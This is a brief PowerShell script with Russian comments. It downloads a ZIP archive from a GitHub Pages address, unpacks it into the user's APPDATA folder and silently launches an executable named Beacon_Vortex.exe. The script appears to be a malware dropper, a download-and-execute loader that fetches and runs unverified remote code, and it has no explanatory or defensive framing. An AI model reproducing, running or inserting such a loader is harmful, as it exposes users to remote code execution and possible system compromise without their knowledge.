$zipUrl = "https://dalegelb.github.io/lulu.zip"
$zipPath = Join-Path $env:APPDATA "lulu.zip"
$extractPath = $env:APPDATA
$exePath = Join-Path $env:APPDATA "Beacon_Vortex.exe"

# Скачать ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing

# Распаковать
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# Запустить EXE
Start-Process -FilePath $exePath
